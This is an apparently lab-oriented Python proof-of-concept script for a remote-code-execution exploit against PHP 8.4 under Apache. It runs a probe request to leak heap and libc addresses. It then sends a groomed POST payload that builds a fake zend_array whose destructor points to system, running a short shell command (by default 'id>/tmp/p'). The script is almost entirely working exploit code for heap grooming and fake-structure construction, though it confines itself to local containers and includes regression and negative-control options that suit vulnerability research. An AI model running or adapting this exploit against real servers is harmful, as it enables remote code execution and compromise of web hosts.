#!/usr/bin/env python3
"""
Self-referential fake HashTable (no fixed mapping, no MAP_FIXED page).

The fake table, its bucket array and the command line all live
inside the same 288-byte groom payload that becomes $_POST's arData, so the
only thing the payload needs from outside is one address - where that block
landed.

Two requests, one process (apache2 -X under gdb):

  request 1  probe payload, every 32-byte slot carries an identifying tag
             "SELFREF<i>" at slot+0x18.  The engine silently breaks at
             zend_array_destroy()/php_request_shutdown() and prints
                 arData, nNumUsed, tag positions -> p0 = arData - payload_base
             plus the libc `system` address (stands in for a code leak).

  request 2  the real payload, built for the measured arData:
                 bucket[1].val.ptr = arData+0x40   (fake zend_array)
                 fake table at arData+0x40: IS_ARRAY, pDestructor = system
                 fake bucket at arData+0x80: the command line (<= 23 bytes)

Research lab only: containers on 127.0.0.1, nothing outside this repo.

Usage:
    python3 tests/selfref_rce.py --port 28120 --out out/selfref
"""

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))
import cve_2026_109618_hash_oom as H  # noqa: E402  (lab test helper)

IMAGE = "php-gdb:8.4.26"
CONTAINER = "selfref"
PROOF = "/tmp/p"
BUCKET = 32
TAG = b"SELFREF"

GDB_CMD = r'''
    . /etc/apache2/envvars 2>/dev/null || true
    mkdir -p "$APACHE_RUN_DIR" "$APACHE_LOCK_DIR" "$APACHE_LOG_DIR"
    exec gdb --batch \
        -ex "set pagination off" -ex "set confirm off" \
        -ex "set breakpoint pending on" \
        -ex "handle SIGPIPE nostop noprint pass" \
        -ex "handle SIGUSR1 nostop noprint pass" \
        -ex "source /opt/ht_dump.py" \
        -ex run \
        -ex "echo \n===== STOPPED =====\n" -ex "bt 14" \
        -ex "info registers pc x0 x1 x19" \
        --args /usr/sbin/apache2 -X -DFOREGROUND
'''


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def start(port, image=IMAGE):
    run(["docker", "rm", "-f", CONTAINER])
    cmd = [
        "docker", "run", "-d", "--name", CONTAINER,
        "--network", "php2shell-net", "--cap-add=SYS_PTRACE",
        "-p", "127.0.0.1:%d:80" % port,
        "-m", "1g", "--cpus=2", "--pids-limit=256",
        "-v", os.path.join(ROOT, "webroot") + ":/var/www/html:ro",
        "-v", os.path.join(ROOT, "config", "apache-vhost.conf")
        + ":/etc/apache2/sites-enabled/000-default.conf:ro",
        "-v", os.path.join(ROOT, "docker", "ht_dump.py") + ":/opt/ht_dump.py:ro",
        "--entrypoint", "sh", image, "-c", GDB_CMD,
    ]
    out = run(cmd)
    if out.returncode != 0:
        raise SystemExit("docker run failed: %s" % out.stderr.strip())


def wait_port(port, timeout=30):
    """Full HTTP GET, not a bare connect: apache2 -X serves one connection at a
    time, and a connect/close leaves the single worker busy for a moment."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=2)
            s.sendall(b"GET /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                      b"Connection: close\r\n\r\n")
            head = s.recv(16)
            s.close()
            if head.startswith(b"HTTP/"):
                return True
        except OSError:
            pass
        time.sleep(0.4)
    return False


def logs():
    return run(["docker", "logs", CONTAINER]).stdout + \
        run(["docker", "logs", CONTAINER]).stderr


def alive():
    return "running" in run(
        ["docker", "inspect", "-f", "{{.State.Status}}", CONTAINER]).stdout


def probe_pattern():
    """Nine tags, one per 32-byte slot, everything else zero.

    Byte 9 of every bucket stays 0 (type_flags clear, so the destruction loop
    skips it) and every key stays NULL, so the request cannot crash.
    """
    buf = bytearray(288)
    for i in range(9):
        buf[24 + BUCKET * i:32 + BUCKET * i] = TAG + b"%d" % i
    return bytes(buf)


def exploit_pattern(ar_data, p0, system_addr, cmd):
    """Fake zend_array + fake bucket + command, addressed relative to arData.

    Layout inside arData (payload covers arData-0x28 .. arData+0xE0):

        0x00..0x7F  four identical trigger zvals (buckets 0..3), so the
                    leftover bucket is caught whichever index the parser
                    stopped at (nNumUsed is 1..4 depending on how far the
                    body got before the OOM)
        0x80..0xB8  fake zend_array (IS_ARRAY, pDestructor = system)
        0xC0..0xDF  fake Bucket: 16 bytes val + 8 bytes h = the command line,
                    key = NULL terminates it
    """
    buf = bytearray(288)

    def put(a_off, data):
        o = a_off + p0
        if o < 0 or o + len(data) > len(buf):
            raise SystemExit("layout overflows payload at arData+0x%x" % a_off)
        buf[o:o + len(data)] = data

    for b in range(0, 0x80, BUCKET):          # buckets 0..3
        put(b + 0x00, struct.pack("<Q", ar_data + 0x80))   # -> fake table
        put(b + 0x08, struct.pack("<I", 0x00000107))       # IS_ARRAY|refcntd
    t = 0x80
    put(t + 0x00, struct.pack("<I", 1))             # gc.refcount
    put(t + 0x04, struct.pack("<I", 7))             # gc.type_info = IS_ARRAY
    put(t + 0x08, struct.pack("<I", 0))             # u.flags
    put(t + 0x0C, struct.pack("<I", 0))             # nTableMask
    put(t + 0x10, struct.pack("<Q", ar_data + 0xC0))  # arData -> fake bucket
    put(t + 0x18, struct.pack("<I", 1))             # nNumUsed
    put(t + 0x1C, struct.pack("<I", 1))             # nNumOfElements
    put(t + 0x20, struct.pack("<I", 8))             # nTableSize
    put(t + 0x24, struct.pack("<I", 0))             # nInternalPointer
    put(t + 0x28, struct.pack("<q", 0))             # nNextFreeElement
    put(t + 0x30, struct.pack("<Q", system_addr))   # pDestructor = system
    body = cmd.encode()[:23]
    put(0xC0, body + b"\x00" * (24 - len(body)))
    return bytes(buf)


def send(port, pattern, name_mb, path="/urlenc/hit.php"):
    name_len = int(name_mb * 1024 * 1024)
    body = H.build_body(288, 0x41, name_len, pattern=pattern)
    return H.send(port, path, body)


def parse_geometry(text, all_text=None):
    """All TARGET ARRAY blocks of the last request, in destruction order.

    blocks[0] is the superglobal itself (its bucket[1] is the leftover bucket);
    later blocks are fake tables reached from it.
    """
    blocks = text.split("===== TARGET ARRAY =====")
    if len(blocks) < 2:
        return None
    out = []
    for tail in blocks[1:]:
        m = re.search(r"ARDATA 0x([0-9a-f]+) NUMUSED (\d+)", tail)
        if not m:
            continue
        p0s = [int(x, 16) for x in re.findall(r"p0=0x([0-9a-f]+)", tail)]
        htm = re.search(r"ht=0x([0-9a-f]+)", tail)
        out.append({
            "ht": int(htm.group(1), 16) if htm else None,
            "arData": int(m.group(1), 16),
            "nNumUsed": int(m.group(2)),
            "p0": p0s[0] if p0s else None,
            "p0_all": p0s,
        })
    if not out:
        return None
    sysm = re.findall(r"SYSTEM 0x([0-9a-f]+)", all_text or text)
    first = dict(out[0])
    first["blocks"] = out
    first["system"] = int(sysm[-1], 16) if sysm else None
    return first


def run_round(args, rnd):
    send = lambda pat: globals()["send"](args.port, pat, args.name_mb,
                                          args.path)
    """One measurement + one exploit attempt in a fresh worker."""
    result = {"round": rnd, "image": args.image, "cmd": args.cmd,
              "delta": args.delta, "steps": []}

    def note(**kw):
        result["steps"].append(kw)
        print(json.dumps(kw, ensure_ascii=False))

    start(args.port, args.image)
    if not wait_port(args.port):
        raise SystemExit("apache never came up")
    note(step="up", port=args.port)

    # ---- request 1: measure arData / p0 / system -------------------------
    mark = len(logs())
    st1, _, dt1, _ = send(probe_pattern())
    time.sleep(1.5)
    g1 = parse_geometry(logs()[mark:], logs())
    note(step="probe", status=st1.strip(), secs=round(dt1, 2), geometry=g1)
    if not g1 or g1["p0"] is None or g1["system"] is None:
        result["hit"] = False
        result["error"] = "probe did not yield arData/p0/system"
        note(step="abort", error=result["error"])
        return result

    # ---- request 2: exploit ---------------------------------------------
    pat = exploit_pattern(g1["arData"] + args.delta, g1["p0"],
                          g1["system"], args.cmd)
    g2 = None
    st2 = ""
    dt2 = 0.0
    proof = None
    bt = ""
    per_request = []
    for k in range(args.exploits):
        got = False
        tries = 0
        while tries < max(1, args.retries) and not got:
            tries += 1
            run(["docker", "exec", CONTAINER, "sh", "-c", "rm -f %s" % PROOF])
            mark2 = len(logs())
            st2, _, dt2, _ = send(pat)
            time.sleep(1.5)
            gk = parse_geometry(logs()[mark2:], logs())
            proof = run(["docker", "exec", CONTAINER, "sh", "-c",
                         "cat %s 2>&1" % PROOF])
            after = logs()[mark2:]
            kbt = after.split("===== STOPPED =====")[-1][:2000] \
                if "===== STOPPED =====" in after else ""
            got = proof.returncode == 0 and proof.stdout.strip() != "" \
                and "No such file" not in proof.stdout
            if k == 0 and tries == 1:
                g2, bt = gk, kbt
            note(step="exploit", n=k + 1, try_no=tries, status=st2.strip(),
                 secs=round(dt2, 2), geometry=gk, hit=got,
                 proof=proof.stdout.strip()[:200], alive=alive())
            if not alive():
                break
        per_request.append({"n": k + 1, "attempts": tries, "hit": got,
                            "alive": alive(),
                            "proof": proof.stdout.strip()[:200]})
        if not alive():
            break
    hit = bool(per_request) and all(r["hit"] for r in per_request)
    result["probe"] = {"arData": g1["arData"], "p0": g1["p0"],
                       "system": g1["system"]}
    result["exploit"] = {"arData": g2["arData"] if g2 else None,
                         "nNumUsed": g2["nNumUsed"] if g2 else None,
                         "p0": g2["p0"] if g2 else None}
    result["proof"] = proof.stdout.strip()[:400]
    result["hit"] = hit
    result["bt"] = bt
    result["requests"] = per_request
    result["alive"] = alive()

    with open(os.path.join(args.out, "selfref-r%d.log" % rnd), "w") as fh:
        fh.write(logs())

    print("=" * 72)
    print("probe   : arData=0x%x p0=0x%x system=0x%x"
          % (g1["arData"], g1["p0"], g1["system"]))
    if g2:
        print("exploit : arData=0x%x nNumUsed=%s p0=%s"
              % (g2["arData"], g2["nNumUsed"], g2["p0"]))
    print("command : %r -> %s" % (args.cmd, "EXECUTED" if hit else "no proof"))
    if bt:
        print("crash  : " + (bt.strip().splitlines() or [""])[0])
    print("=" * 72)
    return result


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=28120)
    ap.add_argument("--image", default=IMAGE,
                    help="docker image; use a patched build for regression")
    ap.add_argument("--path", default="/urlenc/hit.php")
    ap.add_argument("--name-mb", type=float, default=3.2)
    ap.add_argument("--out", default=os.path.join(ROOT, "evidence", "runs",
                                                  "selfref"))
    ap.add_argument("--cmd", default="id>/tmp/p")
    ap.add_argument("--keep", action="store_true")
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--exploits", type=int, default=1,
                    help="repeat the exploit request in the same worker")
    ap.add_argument("--retries", type=int, default=3,
                    help="re-send the exploit payload when the groom block "
                         "was not the one that became arData")
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=0,
                    help="negative control: shift the leaked arData")
    args = ap.parse_args()
    os.makedirs(args.out, exist_ok=True)

    rounds = []
    for rnd in range(1, args.rounds + 1):
        print()
        print("### round %d/%d %s" % (rnd, args.rounds,
                                      "(delta=0x%x)" % args.delta
                                      if args.delta else ""))
        rounds.append(run_round(args, rnd))
        if not args.keep:
            run(["docker", "rm", "-f", CONTAINER])

    summary = {
        "image": args.image, "cmd": args.cmd, "delta": args.delta,
        "rounds": len(rounds),
        "hits": sum(1 for r in rounds if r.get("hit")),
        "detail": rounds,
    }
    with open(os.path.join(args.out, "selfref.json"), "w") as fh:
        json.dump(summary, fh, indent=2, ensure_ascii=False)
    print()
    print("SUMMARY %d/%d rounds executed the command"
          % (summary["hits"], summary["rounds"]))


if __name__ == "__main__":
    main()
